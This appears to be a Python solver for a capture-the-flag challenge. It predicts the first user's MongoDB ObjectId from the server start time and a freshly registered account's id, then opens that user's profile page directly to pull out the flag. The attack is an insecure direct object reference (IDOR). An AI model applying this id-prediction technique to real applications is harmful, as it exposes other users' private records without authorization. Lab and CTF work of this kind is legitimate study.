import requests
import re
import sys

'''
@文件命名：X-099-24
@使用方式: python X-099-24.py url
@简述思路: 基于 Mongo ObjectId 计算首用户的 id，直访 profile 页面提取 flag。
'''


def Scan(url):
    s = requests.Session()
    starttime = int(s.get(url + "/starttime").text.strip())
    start_hex = format(starttime, 'x').rjust(8, '0')
    j = s.post(url + "/register", headers={"Content-Type": "application/x-www-form-urlencoded"}, data="username=ctfuser123&password=123456").json()
    uid = j["userId"]
    dist = int(j["distance"])
    machine = uid[8:14]
    pid = uid[14:18]
    counter_new = int(uid[18:24], 16)
    counter_first_hex = format(counter_new - dist, 'x').rjust(6, '0')
    first_id = start_hex + machine + pid + counter_first_hex
    html = s.get(url + "/profile/" + first_id).text
    return re.search(r"FLAG\{.*?\}", html).group(0)


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
